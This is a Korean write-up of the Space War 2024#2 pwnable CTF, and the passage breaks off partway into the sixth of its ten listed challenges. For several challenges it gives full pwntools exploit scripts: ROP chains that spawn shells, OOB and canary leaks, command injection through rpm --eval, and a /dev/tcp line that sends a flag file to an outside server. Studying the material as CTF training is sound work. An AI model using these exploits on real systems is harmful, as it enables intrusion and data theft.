---
title: Space War 2024#2 (Pwnable) write-up
description: Space War 2024 2번째 Pwnable write-up입니다.
author:
    name: snwo
	link: 
date: 2024-05-23 02:17:33 +0900
tags: [spacewar, pwnable]
categories: [SpaceWar, Pwnable]
comments: false
math: true
mermaid: false
pin: false
---

### 목차
1. unsafe_calculator
2. safe_calculator
3. HSpace Satellite
4. HSpace Satellite2
5. safeimgparser
6. VMUprotect
7. Pormat_string_bug
8. chachacha
9. HSpace Hub
10. InSecureCPP


## Space War 2024#2 (Pwnable) write-up

안녕하세요, Space War 2024#2 Pwnable CTF 파트를 담당한 황선우(snwo)입니다. 
2024년의 두 번째 카테고리별 CTF 으로 포너블(Pwnable) 분야가 진행되었습니다. 
문제를 분석하고 exploit 작성 후 디버깅 지옥에 빠져 시간을 많이 써야하는 포너블 분야 특성상 다른 분야 ctf에 비해 0솔 문제가 많았던 카테고리별 CTF 였습니다.

---

## unsafe_calculator

**출제자 책정 난이도**: easy

주어진 소스코드에서 의심되는 곳은 아래의 두 곳이다.

```py
def operation():
    global expr

    if filter():
        print("you only can type %s"%whitelist)
        return

    nums = re.split('|'.join(map(re.escape, syms)), expr)
    while '' in nums:
        nums.remove('')
    nums = list(map(lambda x:int(x, 16), nums))
    
    opers = re.findall('[\+\-\*\/\|\&\%]', expr)
    
    if len(nums)-1 != len(opers):
        print('%s is invalid expression!'%expr)
        return
    
    expr = expr.replace('%', '%%')

    script = 'val = nums[0]\n'
    for i in range(len(opers)):
        script+=f'val {opers[i]}= {nums[i+1]}\n'
    script += 'print(f\'{expr}=%x\'%val)'
    exec(script)
```

```py
def raise_error(e):
    if type(e) == KeyboardInterrupt:
        print("\nif you want to quit this calculator, type 'exit'\n")
    else:
        if type(e) == EOFError:
            e = 'EOFError'
            error_msg = 'Please do not press CTRL+D'
        else:
            error_msg = f'{expr} is invalid expression!'
        tmp_err_logs = '.'+binascii.hexlify(os.urandom(8)).decode()
        cmd = f'''
            echo "*** {str(e)} ***" > {tmp_err_logs}
            echo {error_msg} >> {tmp_err_logs}
            cat {tmp_err_logs}
            rm {tmp_err_logs}
        '''
        os.system(cmd)
    return
```

exec로는 필터링으로 인해 사실 할 수 있는 게 많이 없고, 결국에는 os.system을 통해 command를 실행시켜야 한다.

그러면, 우리가 할 수 있는 건 raise를 발생시켜서 에러 로그를 저장했다가 출력해주는 곳에서 command를 실행시키는 것이 가장 합리적이다.

이는 division by zero exception을 통해 raise 시킬 수 있고, `1/0&ed|1`라는 입력을 통해 division by zero와 동시에 command injection을 발생시킬 수 있다.

그러면 ed라는 command가 실행되는데, 이는 vim과 똑같이 command를 실행시킬 수 있다.

```bash
!/bin/bash
cat flag.txt > /dev/tcp/{server}/{port}
```

그럼 위와 같은 형태로 데이터를 tcp로 server에 보내서 flag를 가져오는 command를 실행시킬 수 있다.


### 블로그 포스트 작성자의 추가적인 코멘트

파이썬의 Exception handling을 이용한 command injection 문제입니다. whitelist 에서 command injection에 주로 사용되는 `&`, `|` 문자를 허용한다는 점과, Dockerfile에서 `ed` 명령어를 설치하는 두 개의 단서를 찾는다면 쉽게 풀 수 있는 문제였습니다. 

이러한 command injection bypass 유형의 문제는 [hacktricks](https://book.hacktricks.xyz/pentesting-web/command-injection) 사이트에 잘 정리되어있으니 살펴보시는 것을 추천드립니다.


---

## safe_calculator

**출제자 책정 난이도**: easy

```C
void evaluation(calcs *calc, char oper)
{
    switch(oper) {
        case '+':
            calc->val[calc->idx - 2] += calc->val[calc->idx - 1];
            break;
        case '-':
            calc->val[calc->idx - 2] -= calc->val[calc->idx - 1];
            break;
        case '&':
            calc->val[calc->idx - 2] &= calc->val[calc->idx - 1];
            break;
        case '|':
            calc->val[calc->idx - 2] |= calc->val[calc->idx - 1];
            break;
        case '*':
            calc->val[calc->idx - 2] *= calc->val[calc->idx - 1];
            break;
        case '/':
            calc->val[calc->idx - 2] /= calc->val[calc->idx - 1];
            break;
        case '%':
            calc->val[calc->idx - 2] %= calc->val[calc->idx - 1];
            break;
    }
    --calc->idx;
}
```

이를 보면, 모든 연산에서 `calc->idx - 2`라는 index로 배열에 접근하는 걸 볼 수 있다. 코드를 보면 수식을 읽어온 이후 스택에 수를 추가할 때 index를 increase하기 때문에, 만약 수가 두 개 이상 추가되지 않은 상태로 evaluation이 진행되면, out of boundary 취약점으로 인해 `calc->idx`변수의 값이 바뀐다.

이를 이용해, main의 return address를 원하는 방식으로 모두 변조해줄 수 있다.

또, 우선적으로 결과를 출력해준다는 점을 통해 모든 주소들을 leak할 수 있다.

leak을 한 이후에는 원하는 대로 rop payload를 아무렇게나 retrun address에 적어주면 된다.

```python
from pwn import *

e = ELF('./prob')
# p = e.process(aslr=False)
p = remote('0', 51252)

sla = p.sendlineafter
sa = p.sendafter

go = lambda x: sla(b'> ', x)

go(b'+146')
p.recvuntil(b'+146=')
libc = int(p.recvline(), 16)
go(b'+147')
p.recvuntil(b'+147=')
libc += int(p.recvline(), 16) * 0x100000000 - 0x24083
prdi = libc + 0x00159a4f
binsh = libc + 0x1b45bd
system = libc + 0x52290

log.info('[GLIBC} %#x'%libc)

go(b'+14c&41414141&%x'%(system >> 32))
go(b'+14b&41414141&%x'%(system & 0xffffffff))
go(b'+14a&41414141&%x'%(binsh >> 32))
go(b'+149&41414141&%x'%(binsh & 0xffffffff))
go(b'+148&41414141&%x'%(prdi >> 32))
go(b'+147&41414141&%x'%(prdi & 0xffffffff))
go(b'+146&41414141&%x'%(prdi >> 32))
go(b'+145&41414141&%x'%((prdi & 0xffffffff) + 1))
p.interactive()
```

### 블로그 포스트 작성자의 추가적인 코멘트

OOB read/write를 이용한 문제입니다. 개인적인 경험으로는, 문제를 풀 때 출제자 입장에서 생각해보는게 중요한 것 같습니다. 만약 이런식으로 계산기 프로그램을 C 언어로 작성할 때 연산기호가 붙어있거나, 숫자가 없거나 하는 엣지 케이스들을 어떻게 처리할 것인지, 그리고 문제 바이너리는 어떻게 처리하는지 살펴보시면 바이너리를 볼 때 좀 더 쉽게 접근하실 수 있을것이라 생각합니다. 비슷한 문제로는 [pwnable.tw - calc](https://pwnable.tw/challenge/#3) 문제를 추천드립니다. 

---

## HSpace Satellite

**출제자 책정 난이도**: easy

0xee 1 명령을 통해 debug 모드를 활성화 후 
0xff {command} 명령을 사용하여 command를 실행할 수 있다
rpm 명령이 whitelist에 있으므로 rpm --eval 명령을 통해 cat ./flag를 실행시킬 수 있다.

```python
from pwn import *
import time

context.log_level = 'debug'

p = remote('10.10.1.1', 8000)

p.sendline(b'\xee 1')
time.sleep(0.1)

p.sendline(b'\xff rpm --eval="%(cat\${IFS}./flag)"')
time.sleep(0.1)

print(p.recvline())
```


### 블로그 포스트 작성자의 추가적인 코멘트

명령어를 실행시킬 수 있지만 특정 명령어들로 제한되어 이를 bypass 하는 문제입니다. 이 문제에서는 `rpm` 명령어를 실행시킬 수 있고 옵션에는 제한사항이 없는 것을 활용해 `--eval` 옵션으로 임의 코드를 실행할 수 있었습니다. 이와 같이 옵션을 이용해 임의 명령을 실행시킬 수 있는 명령어 리스트를 [GTFOBins](https://gtfobins.github.io/) 에서 확인할 수 있으니 참고하시면 좋을 것 같습니다. 

---

## HSpace Satellite2

**출제자 책정 난이도**: medium

Hspace Satellite2 문제는 명령어 실행 기능이 제거되었다. 
0xee 1 명령을 통해 debug 모드를 활성화 후 0x04로 echo 명령을 실행할 수 있다.

echo는 3번 수행되는데 전달받은 문자열을 stack에 저장하고 BUF_SIZE는 1024이므로 overflow가 가능하다. overflow를 사용하여 canary leak이 가능하다.
```c++
void echo() {
    int str_len;
    char response[512];
    
    if (debug) {
        for (int i = 0; i < 3; i++) {
            memset(response, 0, 512);
            str_len = read(client_sock, response, BUF_SIZE - 1);
            if (str_len == 0 || str_len == -1) {
                return;
            }
            sprintf(message, "Message: %s\n", response);
            write(client_sock, message, strlen(message));
        }
    }
    else {
        sprintf(message, "You should enable debug mode\n");
        write(client_sock, message, strlen(message));
    }
}
```

또한 libc는 stdout, stdin 주소를 0x01 명령어에서 범위 검증을 하지 않기 때문에 leak이 가능하다
```c++
void controlPanels() {
    sprintf(message, "\nCurrent status: %s\n", _status[status]);

    status = atoi(command[1]);
    sprintf(message, "%sNew status: %s\n", message, _status[status]);

    write(client_sock, message, strlen(message));
}
```

libc, canary leak이 모두 되었으므로 echo 함수에서 overflow를 통해 rop payload를 넣을 수 있다.

아래는 rop payload이다.

```python
from pwn import *
import time

context.log_level = 'debug'

p = remote('10.10.1.1', 8001)

p.sendline(b'\xee 1')
time.sleep(0.1)

p.sendline(b'\x01 12')
time.sleep(0.2)

p.recvline()
p.recvline()
libc = u64(p.recvline().strip().split(b': ')[1].ljust(8, b'\x00')) - 0x21b780
log.info('libc base: ' + hex(libc))

p.sendline(b'\x01 8')
time.sleep(0.2)

p.recvline()
p.recvline()
pie = u64(p.recvline().strip().split(b': ')[1].ljust(8, b'\x00')) - 0x3008
log.info('pie base: ' + hex(pie))

p.sendline(b'\x04 echo')
time.sleep(0.1)

p.send(b'test')
p.recvuntil(b'test\n')

p.send(b'a'*520 + b'x')
p.recvuntil(b'x')
canary = u64(p.recv(7).rjust(8, b'\x00'))
log.info('canary: ' + hex(canary))

pause()

poprdi = libc + 0x2a3e5
poprsi = libc + 0x141d5e
poprsi2 = libc + 0x2a3e3
poprdx = libc + 0x11f2e7

libc_open = libc + 0x1144e0
libc_read = libc + 0x1147d0
libc_write = libc + 0x114870
bss = pie + 0x5500

#exploit
payload = b"A"*520
payload += p64(canary)
payload += b"BBBBBBBB"

#write ./flag string
payload += p64(poprdi)
payload += p64(4)
payload += p64(poprsi2)
payload += p64(bss)
payload += p64(0)
payload += p64(poprdx)
payload += p64(7)
payload += p64(0)
payload += p64(libc_read)

#open ./flag
payload += p64(poprdi)
payload += p64(bss)
payload += p64(poprsi2)
payload += p64(0)
payload += p64(0)
payload += p64(libc_open)

#read ./flag
payload += p64(poprdi)
payload += p64(3)
payload += p64(poprsi2)
payload += p64(bss)
payload += p64(0)
payload += p64(poprdx)
payload += p64(100)
payload += p64(0)
payload += p64(libc_read)

#send flag
payload += p64(poprdi)
payload += p64(4)
payload += p64(poprsi2)
payload += p64(bss)
payload += p64(0)
payload += p64(poprdx)
payload += p64(100)
payload += p64(0)
payload += p64(libc_write)

p.send(payload)

p.send(b'./flag\x00')

p.interactive()
```


### 블로그 포스트 작성자의 추가적인 코멘트

이전 `HSpace Satellite` 문제에서 명령어 실행 기능을 제거해 다른 취약점 (OOB, BOF) 을 이용해 익스플로잇 해야하는 문제입니다. 바이너리 사이즈가 작을 때는, 직접 분석해 다른 점을 알아낼 수 있지만 바이너리 사이즈가 클 수록 변경점을 찾는데에 많은 시간이 소요됩니다. 이럴 떄 사용할 수 있는 유용한 툴이 있습니다. [bindiff](https://github.com/google/bindiff) 툴을 사용해 달라진 점을 쉽게 찾을 수 있으니, 사용해보시지 않았다면 이번 기회에 사용해보시는 것을 추천드립니다.

이 문제에서는 OOB read 취약점으로 libc leak 이 가능하고, BOF 취약점으로 ROP가 가능합니다. 하지만 입력을 열린 소켓으로 받기 떄문에, `system("/bin/sh")` 함수를 호출하는 식으로 ROP 페이로드를 작성한다면 명령어를 stdin 으로 전송할 수 없기 떄문에 명령어 실행이 불가능합니다. 이럴 때에는 flag 파일을 읽어 소켓을 통해 파일 내용을 출력하는 식으로 ROP 페이로드를 작성해야합니다. 이 떄 몇 번 FD(file descriptor)를 사용해야하는지 햇갈릴 수도있습니다.

FD 0,1,2 이 숫자들은 각각 stdin, stdout, stderr 을 나타내고 있고, 이후에는 바이너리에서 파일을 열거나 소켓을 열 때 3번부터 할당되게 됩니다. 

```c++
    server_sock = socket(PF_INET, SOCK_STREAM, 0);
    if (server_sock == -1)
        error_handling("socket() error");
...
    while (1) {
        client_addr_size = sizeof(client_addr);
        // 클라이언트 연결 수락
        client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &client_addr_size);
        if (client_sock == -1)
            continue; // 오류 발생 시 무시하고 계속
        pid = fork(); // 새로운 프로세스 생성
        if (pid == -1) {
            close(client_sock);
            continue;
        }
        if (pid == 0) { // 자식 프로세스
            close(server_sock); // 자식에서는 서버 소켓 닫기
            
            while (1) {
                str_len = read(client_sock, message, BUF_SIZE - 1);
...
```

소스코드를 보면 가장 처음 부모프로세스에서 소켓을 열고 클라이언트와 연결되었을 때 자식프로세스를 생성한 뒤 처음 열었던 소켓을 닫는 것을 확인할 수 있습니다. 이 경우 server_sock -> FD 3, client_sock -> FD 4 이렇게 할당되고, 3번 FD는 닫히게 됩니다. 그래서 ROP 페이로드를 작성할 때 flag 파일을 연다면 3번 FD 에 할당될것이고, 3번 FD에서 파일 내용을 읽고 client_sock 를 나타내는 4번 FD에 플래그 내용을 write 함수의 인자로 사용해 사용자에게 파일내용을 전달해야 정상적으로 플래그를 받으실 수 있습니다.

---

## safeimgparser

**출제자 책정 난이도**: medium

풀이자들에게는 바이너리만 제공되지만 편의를 위해 소스코드로 대체. 프로그램의 전체적인 흐름은 다음과 같다.

1. 최대 0x1000 바이트의 custom-format 이미지파일의 내용을 입력받음
2. 무한반복문 안에서 이미지 파싱/수정 기능을 선택해서 사용할 수 있음

```c
struct IMG {
    unsigned char header[16]; // 16 (SAFE IMGP ARSE RRRR)
    short size; // 18 
    unsigned int offset; // 22
    unsigned int width; // 26
    unsigned int height; // 30
    unsigned short filter_type; // 32
    unsigned char data[0xfe0];
};
```
custom 이미지파일은 위와 같은 구조를 가지고 있다.

```c
void parse_img(unsigned char * buf,unsigned char * addr){
    SHIELD(0,addr);
    struct IMG * img = (struct IMG *)buf;
    if((0x50474d4945464153^*(unsigned long*)img->header) || 0x5252525245535241^*(unsigned long*)(img->header+8)){
        puts("invalid header");
        exit(0);
    }
    if(img->size != img->width*img->height*3){
        puts("invalid size");
        exit(0);
    }
    if(img->size < img->offset){
        puts("invalid size");
        exit(0);
    }
    printf("preview rgbs: ");
    unsigned char * unfiltered_buf = unfiltering(img);

    for(int i=0;i<8;i++){
        printf("\033[38;5;%dmΞ %s",unfiltered_buf[i],CLEAR);
    }
    putchar('\n');
  ...
}
```
이미지를 파싱할 때, 만족해야하는 조건이 3가지 있다.

- header == `SAFEIMGPARSERRRR`
- size == `width * height * 3`
- size > offset

위 조건을 통과한 뒤, unfiltering 과정을 거친 이미지 데이터 8바이트를 ansi 코드를 적용한 이모지로 출력해준다.

```c
int main() {
    init();
    unsigned char addr[0x100];
    memset(addr, 0, 0x100);
    unsigned char buf[0x1000];
    SHIELD(0,addr);
    printf("input your BMP image (MAX: 0x1000): ");
    read(0, buf, 0x1000);
    while(true) {
        generate_secret();
        process(buf,addr);
    }
    SHIELD(1,addr);
}
```

파일 내용은 메인함수에 있는 로컬 변수에 위치한다.
조건에는 size 에 대한 제한이 없어서, size를 0x1000 바이트보다 크게 지정하고 알맞은 width, height 값을 전달한다면 오프셋 값을 조절해 범위를 벗어나 스택 값을 leak할 수 있다. `OOB read primitive`

```c
unsigned char * unfiltering(struct IMG * img){
    unsigned char * buf = (unsigned char*)img+img->offset;
    unsigned char * output = (unsigned char *)malloc(img->width*img->height*3);
    unsigned short filter_type = img->filter_type;
    unsigned int width = img->width*3;
    unsigned int height = img->height;
    switch(filter_type) {
        case 1:
            for(int i=0;i<height;i++){
                for(int j=0;j<width;j++){
                    if(j==0){
                        output[i*width+j] = buf[i*width+j];
                    }else{
                        output[i*width+j] = buf[i*width+j] + output[i*width+j-1];
                    }
                }
            }
            break;
        case 2:
            for(int i=0;i<height;i++){
                for(int j=0;j<width;j++){
                    if(i==0){
                        output[i*width+j] = buf[i*width+j];
                    }else{
                        output[i*width+j] = buf[i*width+j] + output[(i-1)*width+j];
                    }
                }
            }
            break;
        default:
            puts("couldn't support filter type :<");
            exit(0);
    }
    return output;
}
```

unfiltering 함수에서는 `img 주소 + offset` 부터 데이터를 가져와, filter_type 에 따라 왼쪽값 또는 위쪽값을 각각 더하는 unfiltering 과정을 거친 뒤 데이터를 리턴합니다.
filter_type 을 2로 지정한다면, `i==0` 일 때 원본 데이터를 복사하므로, `width*3` 만큼의 데이터를 필터링 과정 없이 가져올 수 있습니다.

```c
void modify_img(unsigned char * buf,unsigned char * addr){
    SHIELD(0,addr);
    struct IMG * img = (struct IMG *)buf;
    printf("you can change 1-byte\ninput index: ");
    long index;
    long value;
    scanf("%lu", &index);
    if(index > img->size){
        puts("invalid index");
        exit(0);
    }
    unsigned char * target = buf+img->offset;
    printf("input value: ");
    scanf("%lu", &value);
    target[index] = value;
    SHIELD(1,addr);
}
```

modify_img 함수는 `img 주소 + offset` 에 위치한 1바이트를 수정할 수 있는 기능을 제공합니다. 마찬가지로 offset 값을 크게 지정할 수 있어 `OOB write` 가 가능하고,
`img->size` 가 `short` 자료형으로 선언되어있어 음수 오프셋 또한 사용할 수 있습니다. `OOB write primitive`

```c
int main() {
    init();
    unsigned char addr[0x100];
    memset(addr, 0, 0x100);
    unsigned char buf[0x1000];
    SHIELD(0,addr);
    printf("input your BMP image (MAX: 0x1000): ");
    read(0, buf, 0x1000);
    while(true) {
        generate_secret();
        process(buf,addr);
    }
    SHIELD(1,addr);
}
```

libc leak는 메인 함수의 스택 프레임에 있는 `__libc_start_ret` 값을 가져오면 될 것 같지만, 모든 함수는 `SHIELD` 라는 매크로 함수로 감싸져 있어 return address 를 바로 가져올 수 없습니다.
`OOB read/write` 기능이 존재하긴 하지만, 해당 기능을 제공하는 함수 `process` 를 호출할 때마다 generate_secret 함수로 secret 값이 매번 랜덤한 8바이트로 바뀌게 됩니다.

```c
void _(unsigned long rbp, bool is_end, unsigned char * addr) {
    unsigned char ret;
    if(!is_end){ // start
        ret = *(unsigned char*)(rbp+8);
        if(!addr[ret]){
            addr[ret] = 1;
        }
        *(unsigned long*)(rbp+8) ^= secret;
    }else{
        *(unsigned long*)(rbp+8) ^= secret;
        ret = *(unsigned char*)(rbp+8);
        if(addr[ret]){
            addr[ret] = 0;
        }else{
            puts("control flow error!");
            exit(0);
        }
    }
}
```

함수가 시작 할 때는, 메인 함수에 있는 배열인 addr 에 리턴주소 하위 1바이트를 오프셋으로 사용해 해당 위치의 값을 1로 업데이트 하고, 리턴주소를 secret 값과 8byte XOR 연산을 수행합니다.
함수가 끝날 때는, 리턴주소를 먼저 secret 값과 8byte XOR 연산을 수행한 뒤, 하위 1바이트가 `addr` 배열에 있는지 검사합니다.

```c
    unsigned char addr[0x100];
    memset(addr, 0, 0x100);
    unsigned char buf[0x1000];
```

하지만 addr, buf (이미지 입력값) 은 인접해 있기 때문에 `OOB write primitive` 를 사용해 addr 배열의 특정 오프셋을 1로 설정함으로써 우회가 가능합니다.
최종 익스플로잇 흐름은 다음과 같습니다. 

1. leak `_rtld_global`
2. build rop chain
3. bypass SHIELD macro

`1. leak _rtld_global`

```
   0x0000555555555baf <+159>:	lea    rdx,[rbp-0x1110]
   0x0000555555555bb6 <+166>:	lea    rax,[rbp-0x1010]
   0x0000555555555bbd <+173>:	mov    rsi,rdx
   0x0000555555555bc0 <+176>:	mov    rdi,rax
=> 0x0000555555555bc3 <+179>:	call   0x555555555a21 <process(unsigned char*, unsigned char*)>
```

- buf 주소 = `rbp-0x1010`
- addr 주소 = `rbp-0x1110`

```
gef➤  tel $rbp-0x1010+0x1050
0x007fffffffe4f0│+0x0000: 0x007fffffffe5c8  →  0x007fffffffe81a  →  "/pwn/SafeImgParser/prob/for_organizer/safeimgparse[...]"
0x007fffffffe4f8│+0x0008: 0x00555555555b10  →  <main+0> endbr64
0x007fffffffe500│+0x0010: 0x00555555557d50  →  0x005555555552c0  →  <__do_global_dtors_aux+0> endbr64
0x007fffffffe508│+0x0018: 0x007ffff7ffd040  →  0x007ffff7ffe2e0  →  0x00555555554000  →   jg 0x555555554047 <= _rtld_global
0x007fffffffe510│+0x0020: 0xfbe3596d2e2f0ed1
0x007fffffffe518│+0x0028: 0xfbe34925fd270ed1
0x007fffffffe520│+0x0030: 0x00007fff00000000
0x007fffffffe528│+0x0038: 0x0000000000000000
0x007fffffffe530│+0x0040: 0x0000000000000000
0x007fffffffe538│+0x0048: 0x0000000000000000
gef➤  xinfo 0x007ffff7ffd040
...
Symbol: _rtld_global
```

`buf주소 + 0x1068` 위치에 `_rtld_global` 이 위치해 있습니다. 이미지의 시작 오프셋을 이곳으로 설정해 오프셋을 릭할 수 있습니다. 
ld 라이브러리 상에서의 오프셋은 서버를 기준으로 `0x3a040` 에 위치해있고, libc 와 거리는 서버 기준으로 `0x22d000` 에 위치해 있습니다.
gdb 를 설치하지 않고, 주어진 도커로 환경을 구성한 뒤 `./safeimfsafter &` 명령어로 바이너리를 백그라운드로 실행 후, `/proc/(fd)/maps` 파일을 확인해 libc 와 ld 사이의 거리를 구할 수 있습니다.

`2. build rop chain`

secret 과 xor 된 리턴주소 바로 다음부터 미리 rop chain 을 작성해야합니다. 
함수 호출 흐름을 보면 `main -> process -> modify_img/parse_img` 순으로 진행되기 때문에 rop chain 을 구성하는동안 변화가 없는 `process 의 리턴주소` + 8 에 rop chain 을 작성할 것입니다.

```
→ 0x555555555b0f <process(unsigned+0> ret
   ↳  0x555555555bc8 <main+184>       jmp    0x555555555baa <main+154>
      0x555555555bca                  add    BYTE PTR [rax], al
      0x555555555bcc <_fini+0>        endbr64
      0x555555555bd0 <_fini+4>        sub    rsp, 0x8
      0x555555555bd4 <_fini+8>        add    rsp, 0x8
      0x555555555bd8 <_fini+12>       ret

gef➤  tel $rsp
0x007fffffffd388│+0x0000: 0x00555555555bc8  →  <main+184> jmp 0x555555555baa <main+154>	 ← $rsp
0x007fffffffd390│+0x0008: 0x00000000002158f0
0x007fffffffd398│+0x0010: 0x007fffffffe4b0  →  0x0000000000000001
0x007fffffffd3a0│+0x0018: 0x0000000000000000
0x007fffffffd3a8│+0x0020: 0x0000000000000000
0x007fffffffd3b0│+0x0028: 0x0000000000000000
0x007fffffffd3b8│+0x0030: 0x0000000000000000
0x007fffffffd3c0│+0x0038: 0x0000000000000000
0x007fffffffd3c8│+0x0040: 0x0000000000000000
0x007fffffffd3d0│+0x0048: 0x0000000000000000
gef➤
```

`0x007fffffffd390` 주소부터 rop chain 을 작성하면 되는데, buf 와 거리로 따지면 `buf-278` 입니다. 

`3. bypass SHIELD macro`

modify_img 함수로는 한 번에 1바이트만 수정할 수 있습니다. 위 스택 상황을 봤을 때, process 함수의 리턴 주소 하위 1바이트를 0xd8 으로 바꾼다면 `ret` 가젯이 실행되고 그 다음부터 작성해놓은 rop chain 이 안전하게 실행될 수 있습니다. 
하지만 함수 호출 과정을 봤을 때, `modify_img 으로 1바이트를 바꿈 -> secret 값과 xor됨 -> 1바이트 검사 -> 리턴` 이 순서로 진행되기 때문에, rop chain 을 작성한 다음 addr 배열의 0xd8 인덱스를 1로 설정해야 합니다. buf 와의 거리를 따졌을 때는 `buf-0x100+0xd8` 입니다. 
secret 값은 매번 바뀌고 예측할 수도 없기 때문에 하위 1바이트를 어떤 값을 덮는지 상관없이 secret 값에 의해 1바이트가 결정되므로 addr 의 인덱스만 설정해놓고 xor 되었을 때 0xd8이 될 때까지 1/256 확률로 익스플로잇 코드를 계속 실행하는 방법밖에 없습니다.  

```python
from pwn import *
context.arch = 'amd64'

def build_img(size,offset,width,height,filter_type):
    header = b"SAFEIMGPARSERRRR"
    header += p16(size)
    header += p32(offset)
    header += p32(width)
    header += p32(height)
    header += p16(filter_type)
    # data = filter_data(data,filter_type,width,height)
    return header.ljust(0x1000,b'\x00')

while True:
  try:
    ## local
    #p = process("./safeimgparser")
    #libc = p.libc

    # remote
    p = remote("localhost", 30030)
    libc = ELF("./libc.so.6")

    ## +0x1000+0x68 -> ld+0x3a040 ( libc + 0x22e000 + 0x3a040 )

    ## leak buf+0x1068 (ld+0x3a040)
    data = build_img(0x12c0,0x1068,8,200,2)
    p.sendafter("input your BMP image (MAX: 0x1000): ",data)
    p.sendafter("wanna parse or modify? (p/m): ",b"p\n")
    p.recvuntil(b"rgbs: ")

    data = p.recvline()
    data = data.split(b'\x1b[38;5;')[1:]
    data = [int(x.split(b'm')[0]) for x in data]
    libc_base = u64(bytes(data).ljust(8,b'\x00')) - 0x3a040 - 0x22d000

    print("libc_base",hex(libc_base))
    libc.address = libc_base
    if libc_base < 0:
      p.close()
      continue
    binsh = next(libc.search(b"/bin/sh"))
    system = libc.sym["system"]
    prdi = next(libc.search(asm("pop rdi; ret")))
    ret = prdi+1

    def aaw(offset, data):
      p.sendlineafter("wanna parse or modify? (p/m): ",b"m")
      p.sendlineafter("index: ",str(offset).encode())
      p.sendlineafter("value: ",str(data).encode())

    for i in range(8):
      aaw(-0x1068-280+8+i, (prdi>>i*8)&0xff)
    for i in range(8):
      aaw(-0x1068-280+16+i, (binsh>>i*8)&0xff)
    for i in range(8):
      aaw(-0x1068-280+24+i, (system>>i*8)&0xff)

    aaw(-0x1068-0x100+0xd8,0x01)
    aaw(-0x1068-280,0xaa)

    p.sendline("id")
    p.recvline()
    p.sendline("id")
    p.recvline()
    p.interactive()

  except:
    continue
```


### 블로그 포스트 작성자의 추가적인 코멘트

OOB read/write 취약점을 이용한 문제입니다. OOB read 취약점으로 스택의 모든 값을 읽을 수 있지만, 딱히 남아있는 libc 주소가 없어 ld 주소를 릭해야 합니다. ld 주소의 경우 환경마다 오프셋이 조금씩 변할 수 있기 때문에 도커라이징 된 환경에서 확인해보시는 것을 추천드립니다. 

gdb 를 설치하면 메모리 매핑이 바뀌기 때문에 `/proc/<fd>/maps` 파일을 읽어 오프셋을 계산해야 정확한 결과를 얻을 수 있습니다. 또한, 도커라이징된 환경에서 오프셋을 구한다고 해도 호스트의 커널을 공유하기 떄문에 오프셋이 조금씩 바뀔 수 있습니다. 이럴 떄는 +- 0x1000 만큼 브루트포스 해보며 익스플로잇이 될 떄까지 시도하는 방법으로 해결하실 수 있습니다.  


---

## VMUprotect

**출제자 책정 난이도**: medium

```c++
    char reg[8] = { 0, };
    char opcode = 0;
...
            case '\x04': // mov const to register;
                reg[code[pc]] = code[pc + 1];
                pc += 2;
                break;
            case '\x05': // mov register to register
                reg[code[pc]] = reg[code[pc + 1]];
                pc += 2;
                break;
```

reg 배열의 사이즈는 8이지만, case 4, 5 에서 reg 배열에 대한 범위검사가 생략되어 oob read/write가 가능하다. 이를 이용해 return address 까지의 오프셋을 계산해 libc leak 이후 rop payload를 작성하면 된다.

```python
from pwn import *

context.log_level = 'debug'

#p = process('./VMUnprotect')
p = remote('10.10.1.1', 8002)


payload = b'\x20'*512
payload += b'\x05\x00\x28\x01\x00\x05\x00\x29\x01\x00\x05\x00\x2a\x01\x00\x05\x00\x2b\x01\x00\x05\x00\x2c\x01\x00\x05\x00\x2d\x01\x00\x02'

pause()

p.sendlineafter(b' : ', payload)

libc = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = libc - 0x29d90
log.info(hex(libc_base))

poprdi = libc_base + 0x2a745
binsh = libc_base + 0x1d8678 + 0x20

libc_system = libc_base + 0x50d70 - 0x10

payload = b'\x04\x18' + bytes([p64(poprdi)[0]])
payload += b'\x04\x19' + bytes([p64(poprdi)[1]])
payload += b'\x04\x1a' + bytes([p64(poprdi)[2]])
payload += b'\x04\x1b' + bytes([p64(poprdi)[3]])
payload += b'\x04\x1c' + bytes([p64(poprdi)[4]])
payload += b'\x04\x1d' + bytes([p64(poprdi)[5]])

payload += b'\x04\x20' + bytes([p64(binsh)[0]])
payload += b'\x04\x21' + bytes([p64(binsh)[1]])
payload += b'\x04\x22' + bytes([p64(binsh)[2]])
payload += b'\x04\x23' + bytes([p64(binsh)[3]])
payload += b'\x04\x24' + bytes([p64(binsh)[4]])
payload += b'\x04\x25' + bytes([p64(binsh)[5]])

payload += b'\x04\x30' + bytes([p64(libc_system)[0]])
payload += b'\x04\x31' + bytes([p64(libc_system)[1]])
payload += b'\x04\x32' + bytes([p64(libc_system)[2]])
payload += b'\x04\x33' + bytes([p64(libc_system)[3]])
payload += b'\x04\x34' + bytes([p64(libc_system)[4]])
payload += b'\x04\x35' + bytes([p64(libc_system)[5]])

p.sendline(payload+b'\x20'*20)

p.interactive()
```


### 블로그 포스트 작성자의 추가적인 코멘트

register 배열의 OOB read/write 취약점을 이용해 푸는 문제입니다. 보통 이러한 형식의 VM 문제에서는 대부분 메모리나 스택에서의 OOB read/write 취약점을 의도 하는 경우가 많습니다. 혹은 parallel VM 형식으로 구현되어 race condition, UAF 같은 취약점으로도 출제되기도 합니다. VM 형식의 문제가 출제된다면 레지스터, 메모리, 스택의 범위 검사를 꼼꼼하게 살펴보시는 것을 추천드립니다.

비슷한 VM 형식의 문제로는 5월달 HSpace CTF에 출제된 chatgpt-evm 문제를 추천드립니다. [HSpace Wargame 링크](https://chall.hspace.io/challenges)

또한, 리버싱으로 제작된 VMUnprotect 문제도 HSpace Wargame에 존재하니 같이 풀어보시는 것을 추천드립니다.

---

## Pormat_string_bug

**출제자 책정 난이도**: medium

```C
#include <stdio.h>

void setup() 
{
    setvbuf(stdin, NULL, 2, 0);
    setvbuf(stdout, NULL, 2, 0);
    setvbuf(stderr, NULL, 2, 0);
}

void print(char *argv1, char *argv2, int argc) 
{
    if(argc == 1) {
        printf(argv1);
    } else {
        printf(argv1, argv2);
    }
}

void input(char *format, void *ptr) 
{
    scanf(format, ptr);
}

void _puts(char *buf) 
{
    puts(buf);
}
```

위 코드로 공유라이브러리를 만들어서 setup 함수를 통해 버퍼링만 해결했다. 나머지는 별로 큰 의미를 가지는 함수들은 아니다.

```py
def get_secret():
    if major.value == b'InformationSecurity':
        try:
            with open('./flag.txt', 'rb') as f:
                print(str(b"the flag is '%s'!"), str(f.read()), 2)
        except FileNotFoundError as e:
            C._puts(str(b'Can\'t open the flag.. please contact admin.'))
